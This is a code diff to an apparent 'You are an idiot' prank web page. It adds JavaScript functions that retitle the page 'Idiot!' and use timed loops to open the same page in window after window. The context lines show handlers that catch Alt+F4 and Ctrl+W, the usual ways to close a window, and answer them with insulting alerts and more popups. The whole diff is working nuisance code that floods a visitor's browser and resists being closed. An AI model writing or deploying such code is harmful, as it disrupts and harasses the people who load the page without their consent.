@@ -30,6 +30,25 @@ for (var i = 0; i < 5; i++) {
     openWindow('hellolol.html');
 }
 }
+function redirectUser() {
+    openWindow('hellolol.html');
+}
+function procreatell() {
+    changeTitle("Idiot!");
+    for (var i = 0; i < 5; i++) {
+        window.setTimeout('redirectUser()',500);
+    
+           
+       
+    }
+    }
+    function procreatelll() {
+        changeTitle("Idiot!");
+        for (var i = 0; i < 5; i++) {
+            window.setTimeout('redirectUser()',400);
+        }
+        }
+
 
 function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are an idiot!"); procreate(); } }
 function ctrlwkey() { if (event.keyCode == 17 || event.keyCode == 87) { alert("You are an idiot!"); procreate(); } }
